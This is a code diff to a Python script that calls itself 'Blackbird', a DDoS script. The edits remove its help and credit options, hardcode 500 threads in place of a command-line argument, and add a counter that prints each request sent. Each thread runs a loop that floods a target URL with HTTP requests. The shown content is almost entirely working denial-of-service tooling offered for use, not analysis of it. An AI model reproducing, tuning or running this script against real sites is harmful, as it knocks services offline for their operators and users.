@@ -2950,14 +2950,7 @@ reffers_append()
 def usage():
 	print('Blackbird is a DDOS script built by Alpha in 2021')
 	print('_____________________________________________________________')
-
-if sys.argv[0]=='-h':
-    usage()
-    quit()
-
-if sys.argv[0]=='credit':
-	print('github : https://github.com/NotFoundHacker')
-	print('youtube : https://www.youtube.com/channel/UC_tN73NX_750otcFUpqtaNw')
+usage()
 
 def trang():
     while True:
@@ -2967,8 +2960,12 @@ def trang():
     req=urllib.request.Request(url, headers=headers)
     thrill=urllib.request.urlopen(req)
 
+    global req_num_count
+    req_num_count+=1
+    print(req_num_count)
+
 def trang_send():
-    for i in range(sys.argv[1]):
+    for i in range(500):
         get_attack=threading.Thread(target=trang)
         get_attack.start()
 
